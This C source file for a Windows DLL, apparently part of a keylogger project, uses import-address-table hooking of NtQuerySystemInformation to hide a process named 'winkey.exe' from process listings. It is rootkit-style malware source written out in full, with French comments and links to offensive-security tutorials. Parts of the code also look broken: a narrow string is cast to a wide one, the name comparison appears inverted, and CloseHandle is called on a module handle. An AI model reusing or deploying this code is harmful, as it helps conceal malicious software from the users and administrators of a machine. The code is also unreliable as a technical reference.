#include "../includes/dll.h"

NtQuerySystemInformationHk OrigNtQuerySystemInformation;

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
)
{
	NTSTATUS status = OrigNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
	{
		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoCurr = NULL;
		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)(SystemInformation);
        do
        {
            sysProcInfoCurr = sysProcInfoNext;
            sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)((PUCHAR)sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
            if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"winkey.exe"))
            {
                
                if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
                else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
            }
        } while (sysProcInfoCurr->NextEntryOffset);
	}
    return status;
}

//https://www.youtube.com/watch?v=uS22dBJpr7U
void StartHook()
{
    MODULEINFO moduleInfo = {0};
    HMODULE hModule= GetModuleHandle(NULL);//charge le module courant quand LPCSTR == 0 => Si ce paramètre est NULL, GetModuleHandle retourne un handle au fichier utilisé pour créer le processus appelant (fichier.exe).
    GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));
    LPBYTE baseAddr = (LPBYTE)moduleInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)baseAddr;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(baseAddr + pImgDosHdr->e_lfanew);//https://0xrick.github.io/win-internals/pe3/
    PIMAGE_OPTIONAL_HEADER pImgOptHdr = (PIMAGE_OPTIONAL_HEADER)&(pImgNtHdr->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddr + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); //IAT table => https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking c'est un import statique, si la fonction est importe de facon dynamique, cette technique ne fonctionnera pas.

    for (; pImgImpDesc->Characteristics; pImgImpDesc++)
    {
        if (strcmp("ntdll.dll", (char *)(baseAddr + pImgImpDesc->Name)) == 0)//Name is an offset
            break;
    }
    PIMAGE_THUNK_DATA pImgThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pImgFirstThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->FirstThunk);
    PIMAGE_IMPORT_BY_NAME pImgImpByName;
    for (; !(pImgThData->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pImgThData->u1.AddressOfData; pImgThData++)
    {
        pImgImpByName = (PIMAGE_IMPORT_BY_NAME)(baseAddr + pImgThData->u1.AddressOfData);
        if (strcmp("NtQuerySystemInformation", (char *)pImgImpByName->Name) == 0)
            break;
        pImgFirstThData++;
    }
    DWORD dwOld = 0;
    VirtualProtect((PVOID)&(pImgFirstThData->u1.Function), sizeof(dwOld), PAGE_READWRITE, &dwOld);
    pImgFirstThData->u1.Function = (ULONGLONG)HookedNtQuerySystemInformation;
    VirtualProtect((PVOID)&(pImgFirstThData->u1.Function), sizeof(dwOld), dwOld, NULL);
    CloseHandle(hModule);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            
            OrigNtQuerySystemInformation  = (NtQuerySystemInformationHk)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
            StartHook();
            break;
        case DLL_PROCESS_DETACH:
            
            break;
        default:
            break;
    }
    return TRUE;
}